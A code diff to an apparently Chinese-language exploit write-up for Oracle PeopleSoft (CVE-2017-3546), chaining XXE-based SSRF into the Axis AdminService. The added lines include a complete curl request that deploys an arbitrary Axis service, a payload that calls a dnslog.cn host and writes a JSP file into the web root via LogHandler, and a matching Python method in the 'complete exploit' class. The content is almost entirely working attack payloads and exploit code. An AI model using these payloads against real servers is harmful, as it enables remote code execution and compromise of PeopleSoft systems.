@@ -76,6 +76,17 @@ Content-Type: application/xml
 
 #### [CVE-2017-3546] SSRF
 
+#### 直接部署Service
+```bash
+curl -i -s -k -X $'POST'     -H $'Host: <ip>:<port>' -H $'Cookie: '     --data-binary $'<?xml version=\"1.0\"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM \"http://localhost:<port>/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22YZWXOUuHhildsVmHwIKdZbDCNmRHznXR%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment\"> ]><IBRequest><ExternalOperationName>&x;</ExternalOperationName><OperationType/><From><RequestingNode/><Password/><OrigUser/><OrigNode/><OrigProcess/><OrigTimeStamp/></From><To><FinalDestination/><DestinationNode/><SubChannel/></To><ContentSections><ContentSection><NonRepudiation/><MessageVersion/><Data></Data></ContentSection></ContentSections></IBRequest>'     $'http://<ip>:<port>/PSIGW/HttpListeningConnector'
+```
+其他的class:
+```
+<?xml version="1.0"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM "http://333.cjmut0.dnslog.cn:8140/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22YZWXOUuHhildsVmHwIKdZbDCNmRHznXR%22+provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler+type%3D%22RandomLog%22%2F%3E%3C%2FrequestFlow%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22java.util.Random%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3Chandler+name%3D%22RandomLog%22+type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22+%3E%3Cparameter+name%3D%22LogHandler.fileName%22+value%3D%22.%2Fapplications%2Fpeoplesoft%2FPSOL%2Ftest1.jsp%22+%2F%3E%3Cparameter+name%3D%22LogHandler.writeToConsole%22+value%3D%22false%22+%2F%3E%3C%2Fhandler%3E%3C%2Fns1%3Adeployment"> ]><IBRequest><ExternalOperationName>&x;</ExternalOperationName><OperationType/><From><RequestingNode/><Password/><OrigUser/><OrigNode/><OrigProcess/><OrigTimeStamp/></From><To><FinalDestination/><DestinationNode/><SubChannel/></To><ContentSections><ContentSection><NonRepudiation/><MessageVersion/><Data></Data></ContentSection></ContentSections></IBRequest>
+```
+
+这里是部署`org.apache.axis.client.ServiceFactory`这个class。默认是`org.apache.pluto.portalImpl.Deploy`。
+
 
 #### 完整exploit
 ```py
@@ -196,7 +207,7 @@ class Recon(Browser):
         r = self.get('/psp/%s/signon.html' % self.site_id)
 
         for c, v in self.session.cookies.items():
-            if c.endswith('-PORTAL-PSJSESSIONID'):   # 这里当Set-Cookie的值有多个-分割是会有bug。待实际环境修改此处
+            if c.endswith('-PORTAL-PSJSESSIONID'):   # 这里当Set-Cookie的值有多个-分割是会有bug。待实际环境修改此处。
                 #self.local_host, self.local_port, *_ = c.split('-')
                 self.local_host, self.local_port = 'localhost','80'
                 o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
@@ -259,6 +270,27 @@ class AxisDeploy(Recon):
             </ns1:service>
         </ns1:deployment>
         """ % (self.service_name, CLASS_NAME)
+        
+    def soap_service_deploy2(self):
+        """SOAP payload to deploy the service.
+        """
+        return """
+        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
+        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
+        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
+           <ns1:service name="%s" provider="java:RPC">
+              <requestFlow>
+                 <handler type="RandomLog"/>
+             </requestFlow>
+             <ns1:parameter name="className" value="java.util.Random"/>
+             <ns1:parameter name="allowedMethods" value="*"/>
+          </ns1:service>
+          <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
+             <parameter name="LogHandler.fileName" value="./applications/peoplesoft/PSOL/test1.jsp" />   
+             <parameter name="LogHandler.writeToConsole" value="false" /> 
+          </handler>
+        </ns1:deployment>
+        """ % (self.service_name)
 
     def soap_service_undeploy(self):
         """SOAP payload to undeploy the service.
